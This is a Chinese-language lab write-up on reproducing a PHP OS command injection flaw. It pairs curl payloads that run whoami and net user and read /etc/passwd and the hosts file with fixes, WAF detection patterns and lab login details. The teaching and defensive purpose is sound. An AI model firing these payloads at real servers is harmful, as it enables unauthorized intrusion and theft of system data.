# 系统命令执行漏洞利用与复现

## 1. 问题现状

### 背景描述

本文记录了一次完整的系统命令执行漏洞（OS Command Injection）复现实验。攻击者通过 Web 参数注入恶意系统命令，获取服务器敏感信息。

### 实验环境

| 角色 | 配置 |
|------|------|
| 操作机（攻击者） | Win10 / Administrator / Sangfor!7890 |
| 靶机 | Apache + PHP |
| 实验地址 | http://ip/os/system.php |

### 漏洞成因

Web 应用将用户可控参数直接拼接入系统命令执行语句，未做任何过滤或参数化处理：

```php
// 漏洞代码示意
$a = $_GET['a'];
system("command " . $a);
```

### 核心风险

- **RCE 级别**：可直接在服务器上执行任意操作系统命令
- **信息收集**：查看文件、目录结构、系统用户、敏感配置
- **横向移动**：以服务器为跳板进一步渗透内网

## 2. 解决思路与方案对比

### 攻击路径（实验验证）

```
访问 http://ip/os/system.php?a=[command]
  → PHP system() 直接执行注入命令
  → 命令结果通过页面回显
```

### 典型利用命令序列

| 目标 | 注入命令 | 说明 |
|------|----------|------|
| 获取当前路径 | `?a=cd` | 确认 Web 目录位置 |
| 列出文件 | `?a=dir` | 查看目录结构 |
| 查看用户 | `?a=net user` | 获取系统账户列表 |
| 读取 hosts 文件 | `?a=type c:\windows\system32\drivers\etc\hosts` | 获取本地网络配置 |

### 防御方案对比

| 方案 | 描述 | 实施难度 |
|------|------|----------|
| 参数化命令执行 | 避免 shell 执行，改用 exec() + 参数数组 | 中（需重构代码）|
| 输入过滤 | 白名单校验，移除 `; & | $ ()` 等特殊字符 | 低（但易被绕过）|
| 最小权限运行 | Web 服务以低权限账户运行 | 低 |
| WAF 防护 | 部署 Web 应用防火墙拦截恶意请求 | 中 |

## 3. 最佳实践框架

### 推荐方案：参数化 + 最小权限

```
[用户输入] → [白名单校验] → [参数化执行] → [结果输出]
                    ↓
              拒绝非法字符：; & | $ ` ( ) [ ] { } < > \n \r
```

### PHP 安全编码规范

```php
// ❌ 危险写法
$cmd = "ls " . $_GET['path'];
system($cmd);

// ✅ 安全写法（参数化）
$allowed_cmds = ['ls', 'dir', 'whoami'];
$cmd = $_GET['cmd'];
if (!in_array($cmd, $allowed_cmds)) {
    die('Invalid command');
}
$escaped_arg = escapeshellarg($_GET['arg']);
system($cmd . " " . $escaped_arg);
```

## 4. 具体操作步骤

### 检测阶段

**Step 1：确认漏洞存在**

```bash
# 测试命令注入回显
curl "http://target/os/system.php?a=whoami"
# 若返回当前 Web 服务账户名，则漏洞存在
```

**Step 2：确认目录结构**

```bash
# Windows 靶机
curl "http://target/os/system.php?a=dir"

# Linux 靶机
curl "http://target/os/system.php?a=ls"
```

**Step 3：读取敏感文件**

```bash
# Windows：读取 hosts 文件
curl "http://target/os/system.php?a=type%20c:\windows\system32\drivers\etc\hosts"

# Linux：读取 /etc/passwd
curl "http://target/os/system.php?a=cat%20/etc/passwd"
```

### 修复阶段

**Step 1：代码层修复**

- 避免使用 `system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`
- 如必须调用系统命令，使用 `escapeshellcmd()` + `escapeshellarg()`
- 或完全重构为 PHP 原生实现（如 `scandir()` 替代 `ls`）

**Step 2：Web 服务器权限最小化**

```php
// php.ini 配置
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

**Step 3：WAF 规则**

检测以下特征请求并拦截：
```
; ls
& whoami
| cat /etc/passwd
`id`
$(whoami)
```

## 5. 总结与建议

### 核心教训

- **系统命令执行漏洞是最高危漏洞之一**：一旦存在，攻击者直接获得服务器控制权
- **回显型命令注入最容易利用**：结果直接输出在页面上，无须猜测
- **最小权限是最后防线**：即使被突破，限制账户权限可降低损害

### 日常运维建议

1. **代码审查**：对所有涉及系统调用的代码进行安全审计
2. **禁用高危函数**：在 `php.ini` 中禁用危险命令执行函数
3. **日志监控**：关注 Web 日志中的异常命令注入尝试
4. **渗透测试**：定期进行黑盒渗透测试，及早发现漏洞

> 命令执行漏洞的本质是将「数据」和「指令」的边界混淆。防御的核心是永远不要让用户输入直接进入命令解析器。
